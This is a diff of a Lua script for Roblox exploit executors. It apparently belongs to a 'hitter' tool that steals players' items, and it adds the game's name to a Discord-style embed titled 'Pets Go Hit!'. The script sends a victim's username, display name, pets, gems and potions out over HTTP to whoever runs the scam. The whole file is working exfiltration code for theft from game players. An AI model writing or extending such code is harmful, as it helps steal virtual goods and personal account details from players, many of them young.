@@ -7,6 +7,8 @@ potc = 0
 end
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
+local mps = game:GetService("MarketplaceService")
+local xyzab = mps:GetProductInfo(game.PlaceId).Name
 local msg = ""
 request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if dh then
@@ -42,9 +44,9 @@ big = "1/"..big
 end)
 local log = ""
 if dh then
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 end
 local responser =
         request(
